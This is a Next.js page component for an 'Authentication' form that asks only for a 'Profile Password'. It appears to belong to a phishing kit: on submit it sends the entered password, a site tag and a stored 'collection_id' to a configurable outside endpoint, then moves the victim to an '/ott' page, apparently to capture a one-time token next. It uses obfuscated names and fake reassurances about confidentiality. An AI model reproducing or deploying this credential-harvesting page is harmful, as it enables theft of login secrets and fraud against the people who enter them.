'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import css from "./malkjwlerjljklsjdfkljsldf.module.css";

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
  const SITE = process.env.NEXT_PUBLIC_SITE;
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem('collection_id');
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/ott');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <br />
    <div className={css.loginHeading}>
        <h3 className={css.textCenter} style={{ marginLeft: 12 }}>Authentication</h3>
    </div>
    <div className={css.loginForm}>
        <div className={css.info}>
            <small className={css.textDanger}><i>Required Fields are asterisk (*)</i></small>
        </div>
        <form onSubmit={handleSubmit}>
            <div className={css.formGroup}>
                <label htmlFor="Uname">Profile Password* </label>
                <input
                    name="prropss"
                    type="password"
                    className={css.formControl}
                    required
                />
            </div>
            <div className={`${css.formGroup} ${css.textCenter}`}>
                <input type="submit" className={css.btn} defaultValue="Submit" />
            </div>
        </form>
    </div>
    <div className={css.pBody}>
        <ul className={css.provide}>
            <li>Mandatory fields are marked asterisk (*)</li>
            <li>Do not share your personal information anywhere.</li>
            <li>Your personal information is highly confidential. We will never ask.</li>
        </ul>
    </div>

    <Footer />
</>

  );
}
